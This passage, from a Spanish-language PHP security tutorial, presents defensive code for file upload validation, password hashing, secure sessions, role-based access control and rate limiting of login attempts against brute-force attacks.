        $mime = $finfo->file($archivo['tmp_name']);
        
        if (!in_array($mime, $config['mime_types_permitidos'])) {
            $this->errores[] = "Tipo de archivo no permitido";
            return false;
        }
        
        // Validar que sea imagen real (si se requiere)
        if ($config['requerir_imagen']) {
            $imagen_info = getimagesize($archivo['tmp_name']);
            if ($imagen_info === false) {
                $this->errores[] = "El archivo no es una imagen válida";
                return false;
            }
        }
        
        return true;
    }
    
    /**
     * Generar nombre seguro para archivo
     */
    public function generar_nombre_seguro($archivo) {
        $extension = strtolower(pathinfo($archivo['name'], PATHINFO_EXTENSION));
        return bin2hex(random_bytes(16)) . '.' . $extension;
    }
    
    /**
     * Mover archivo de forma segura
     */
    public function mover_archivo($archivo, $directorio_destino) {
        // Crear directorio si no existe
        if (!is_dir($directorio_destino)) {
            mkdir($directorio_destino, 0755, true);
        }
        
        // Generar nombre único
        $nombre_archivo = $this->generar_nombre_seguro($archivo);
        $ruta_destino = $directorio_destino . '/' . $nombre_archivo;
        
        // Mover archivo
        if (move_uploaded_file($archivo['tmp_name'], $ruta_destino)) {
            // Establecer permisos seguros
            chmod($ruta_destino, 0644);
            return $nombre_archivo;
        }
        
        $this->errores[] = "Error al mover el archivo";
        return false;
    }
    
    /**
     * Obtener errores
     */
    public function obtener_errores() {
        return $this->errores;
    }
}

// === EJEMPLO DE USO ===

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['documento'])) {
    $validador = new ValidadorArchivos();
    
    // Validar archivo
    $es_valido = $validador->validar($_FILES['documento'], [
        'tamano_max' => 10485760, // 10MB
        'extensiones_permitidas' => ['pdf', 'doc', 'docx'],
        'mime_types_permitidos' => [
            'application/pdf',
            'application/msword',
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        ]
    ]);
    
    if ($es_valido) {
        // Mover archivo
        $nombre = $validador->mover_archivo($_FILES['documento'], 'uploads/documentos');
        
        if ($nombre) {
            echo "Archivo subido: $nombre";
        } else {
            echo "Error al subir archivo";
        }
    } else {
        foreach ($validador->obtener_errores() as $error) {
            echo "<p>$error</p>";
        }
    }
}
?>
```

---

## 6. Autenticación y Autorización Segura {#autenticacion}

### Hash de Contraseñas

```php
<?php
/**
 * Clase para manejo seguro de contraseñas
 */
class SeguridadPassword {
    
    /**
     * Hashear contraseña
     */
    public static function hash($password) {
        // PASSWORD_DEFAULT usa bcrypt (actualmente)
        // Ajusta automáticamente el cost con el tiempo
        return password_hash($password, PASSWORD_DEFAULT);
    }
    
    /**
     * Verificar contraseña
     */
    public static function verificar($password, $hash) {
        return password_verify($password, $hash);
    }
    
    /**
     * Verificar si necesita rehash
     */
    public static function necesita_rehash($hash) {
        return password_needs_rehash($hash, PASSWORD_DEFAULT);
    }
    
    /**
     * Generar contraseña aleatoria segura
     */
    public static function generar($longitud = 16) {
        $caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
        $password = '';
        $max = strlen($caracteres) - 1;
        
        for ($i = 0; $i < $longitud; $i++) {
            $password .= $caracteres[random_int(0, $max)];
        }
        
        return $password;
    }
}

// === EJEMPLO: REGISTRO DE USUARIO ===

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Hash de la contraseña
    $password_hash = SeguridadPassword::hash($password);
    
    // Guardar en base de datos
    $stmt = $pdo->prepare("INSERT INTO usuarios (email, password_hash) VALUES (?, ?)");
    $stmt->execute([$email, $password_hash]);
}

// === EJEMPLO: LOGIN ===

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Buscar usuario
    $stmt = $pdo->prepare("SELECT id, email, password_hash FROM usuarios WHERE email = ?");
    $stmt->execute([$email]);
    $usuario = $stmt->fetch();
    
    if ($usuario && SeguridadPassword::verificar($password, $usuario['password_hash'])) {
        // Login exitoso
        session_start();
        $_SESSION['usuario_id'] = $usuario['id'];
        $_SESSION['usuario_email'] = $usuario['email'];
        
        // Verificar si necesita rehash (por cambio de algoritmo)
        if (SeguridadPassword::necesita_rehash($usuario['password_hash'])) {
            $nuevo_hash = SeguridadPassword::hash($password);
            $stmt = $pdo->prepare("UPDATE usuarios SET password_hash = ? WHERE id = ?");
            $stmt->execute([$nuevo_hash, $usuario['id']]);
        }
        
        header('Location: dashboard.php');
        exit;
    } else {
        echo "Credenciales inválidas";
    }
}
?>
```

### Sesiones Seguras

```php
<?php
/**
 * Configuración de sesiones seguras
 */
class SesionSegura {
    
    /**
     * Iniciar sesión con configuración segura
     */
    public static function iniciar() {
        // Configuración de sesión
        ini_set('session.use_strict_mode', 1);
        ini_set('session.cookie_httponly', 1);
        ini_set('session.cookie_secure', 1); // Solo HTTPS
        ini_set('session.cookie_samesite', 'Strict');
        ini_set('session.use_only_cookies', 1);
        
        session_start([
            'cookie_lifetime' => 0, // Hasta cerrar navegador
            'cookie_httponly' => true,
            'cookie_secure' => true,
            'cookie_samesite' => 'Strict',
            'use_strict_mode' => true
        ]);
        
        // Regenerar ID de sesión periódicamente
        if (!isset($_SESSION['ultimo_regeneracion'])) {
            self::regenerar_id();
        } else {
            // Regenerar cada 30 minutos
            if (time() - $_SESSION['ultimo_regeneracion'] > 1800) {
                self::regenerar_id();
            }
        }
        
        // Validar sesión
        self::validar();
    }
    
    /**
     * Regenerar ID de sesión
     */
    public static function regenerar_id() {
        session_regenerate_id(true);
        $_SESSION['ultimo_regeneracion'] = time();
    }
    
    /**
     * Validar sesión (prevenir session hijacking)
     */
    private static function validar() {
        // Validar User Agent
        if (!isset($_SESSION['user_agent'])) {
            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        } elseif ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
            self::destruir();
            die('Sesión inválida');
        }
        
        // Validar IP (opcional, puede causar problemas con IPs dinámicas)
        /*
        if (!isset($_SESSION['ip_address'])) {
            $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
        } elseif ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
            self::destruir();
            die('Sesión inválida');
        }
        */
    }
    
    /**
     * Destruir sesión
     */
    public static function destruir() {
        session_unset();
        session_destroy();
        
        // Eliminar cookie de sesión
        if (isset($_COOKIE[session_name()])) {
            setcookie(session_name(), '', time() - 3600, '/');
        }
    }
    
    /**
     * Verificar si usuario está autenticado
     */
    public static function esta_autenticado() {
        return isset($_SESSION['usuario_id']);
    }
    
    /**
     * Requerir autenticación
     */
    public static function requerir_autenticacion() {
        if (!self::esta_autenticado()) {
            header('Location: login.php');
            exit;
        }
    }
    
    /**
     * Obtener usuario ID
     */
    public static function obtener_usuario_id() {
        return $_SESSION['usuario_id'] ?? null;
    }
}

// === EJEMPLO DE USO ===

// En todas las páginas
SesionSegura::iniciar();

// En páginas protegidas
SesionSegura::requerir_autenticacion();

// Login
if ($login_exitoso) {
    $_SESSION['usuario_id'] = $usuario['id'];
    $_SESSION['usuario_rol'] = $usuario['rol'];
}

// Logout
if (isset($_POST['logout'])) {
    SesionSegura::destruir();
    header('Location: login.php');
    exit;
}
?>
```

### Control de Acceso (Autorización)

```php
<?php
/**
 * Sistema de roles y permisos
 */
class ControlAcceso {
    
    private static $roles = [
        'admin' => ['*'], // Todos los permisos
        'editor' => ['leer', 'crear', 'editar'],
        'usuario' => ['leer']
    ];
    
    /**
     * Verificar si usuario tiene permiso
     */
    public static function tiene_permiso($permiso) {
        if (!isset($_SESSION['usuario_rol'])) {
            return false;
        }
        
        $rol = $_SESSION['usuario_rol'];
        
        // Admin tiene todos los permisos
        if (in_array('*', self::$roles[$rol])) {
            return true;
        }
        
        return in_array($permiso, self::$roles[$rol]);
    }
    
    /**
     * Requerir permiso
     */
    public static function requerir_permiso($permiso) {
        if (!self::tiene_permiso($permiso)) {
            http_response_code(403);
            die('No tienes permisos para realizar esta acción');
        }
    }
    
    /**
     * Verificar si es admin
     */
    public static function es_admin() {
        return isset($_SESSION['usuario_rol']) && $_SESSION['usuario_rol'] === 'admin';
    }
}

// === EJEMPLO DE USO ===

// Requerir permiso específico
ControlAcceso::requerir_permiso('editar');

// Verificar permiso
if (ControlAcceso::tiene_permiso('eliminar')) {
    // Mostrar botón eliminar
}

// Solo para admins
if (ControlAcceso::es_admin()) {
    // Mostrar panel de administración
}
?>
```

---

## 7. Protección contra Ataques de Fuerza Bruta {#fuerza-bruta}

### ¿Qué es un Ataque de Fuerza Bruta?
Un ataque de fuerza bruta consiste en **probar combinaciones de usuario y contraseña de forma repetitiva** hasta encontrar una válida.  
Puede automatizarse con herramientas como **Hydra**, **Burp Intruder** o scripts simples.

### Estrategias de Mitigación
1. **Rate limiting:** limitar la frecuencia de intentos fallidos.  
2. **Bloqueo temporal:** suspender la cuenta o IP tras varios fallos.  
3. **Captchas:** frenar bots automatizados.  
4. **Notificaciones de intentos sospechosos.**  
5. **Hash seguro y verificación lenta de contraseñas.**

---

### Implementación de Rate Limiting en PHP
```php
<?php
class RateLimiter {
    private $pdo;

    public function __construct($pdo) {
        $this->pdo = $pdo;
        $this->crear_tabla();
    }

    private function crear_tabla() {
        $sql = "CREATE TABLE IF NOT EXISTS intentos_login (
            id INT AUTO_INCREMENT PRIMARY KEY,
            ip_address VARCHAR(45) NOT NULL,
            email VARCHAR(255),
            intentos INT DEFAULT 0,
            bloqueado_hasta DATETIME NULL,
            ultimo_intento DATETIME NOT NULL,
            INDEX (ip_address),
            INDEX (email)
        )";
        $this->pdo->exec($sql);
    }

    public function esta_bloqueado($ip, $email = null) {
        $sql = "SELECT bloqueado_hasta FROM intentos_login 
                WHERE ip_address = ? AND (email = ? OR email IS NULL)
                ORDER BY bloqueado_hasta DESC LIMIT 1";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$ip, $email]);
        $registro = $stmt->fetch();
        if ($registro && $registro['bloqueado_hasta']) {
            $bloqueado_hasta = new DateTime($registro['bloqueado_hasta']);
            $ahora = new DateTime();
            return $ahora < $bloqueado_hasta;
        }
        return false;
    }

    public function registrar_intento_fallido($ip, $email = null) {
        $sql = "SELECT id, intentos FROM intentos_login 
                WHERE ip_address = ? AND (email = ? OR email IS NULL)
                AND ultimo_intento > DATE_SUB(NOW(), INTERVAL 1 HOUR)";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$ip, $email]);
        $registro = $stmt->fetch();

        if ($registro) {
            $intentos = $registro['intentos'] + 1;
            $bloqueado_hasta = null;
            if ($intentos >= 5) {
                $minutos_bloqueo = pow(2, $intentos - 5) * 15;
                $minutos_bloqueo = min($minutos_bloqueo, 1440);
                $bloqueado_hasta = date('Y-m-d H:i:s', time() + ($minutos_bloqueo * 60));
            }
            $sql = "UPDATE intentos_login 
                    SET intentos = ?, bloqueado_hasta = ?, ultimo_intento = NOW() 
                    WHERE id = ?";
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([$intentos, $bloqueado_hasta, $registro['id']]);
        } else {
            $sql = "INSERT INTO intentos_login (ip_address, email, intentos, ultimo_intento)
                    VALUES (?, ?, 1, NOW())";
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([$ip, $email]);
        }
    }

    public function limpiar_intentos($ip, $email = null) {
        $sql = "DELETE FROM intentos_login WHERE ip_address = ? AND (email = ? OR email IS NULL)";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$ip, $email]);
    }

    public function tiempo_bloqueo_restante($ip, $email = null) {
        $sql = "SELECT bloqueado_hasta FROM intentos_login 
                WHERE ip_address = ? AND (email = ? OR email IS NULL)
                ORDER BY bloqueado_hasta DESC LIMIT 1";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$ip, $email]);
        $registro = $stmt->fetch();
        if ($registro && $registro['bloqueado_hasta']) {
            $bloqueado_hasta = new DateTime($registro['bloqueado_hasta']);
            $ahora = new DateTime();
            if ($ahora < $bloqueado_hasta) {
                $diff = $bloqueado_hasta->getTimestamp() - $ahora->getTimestamp();
                return ceil($diff / 60) . " minutos";
            }
        }
        return null;
    }
}
?>
```

### Ejemplo Completo de Uso en Login
```php
<?php
session_start();
require_once 'RateLimiter.php';
require_once 'SeguridadPassword.php';

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'] ?? null;
$password = $_POST['password'] ?? '';

$limiter = new RateLimiter($pdo);

if ($limiter->esta_bloqueado($ip, $email)) {
    $tiempo = $limiter->tiempo_bloqueo_restante($ip, $email);
    die("Demasiados intentos fallidos. Intenta de nuevo en $tiempo.");
}

$stmt = $pdo->prepare("SELECT id, email, password_hash FROM usuarios WHERE email = ?");
$stmt->execute([$email]);
$usuario = $stmt->fetch();

if ($usuario && SeguridadPassword::verificar($password, $usuario['password_hash'])) {
    $limiter->limpiar_intentos($ip, $email);
    $_SESSION['usuario_id'] = $usuario['id'];
    $_SESSION['usuario_email'] = $usuario['email'];
    echo "Inicio de sesión correcto";
} else {
    $limiter->registrar_intento_fallido($ip, $email);
    echo "Credenciales incorrectas.";
}
?>
```

---

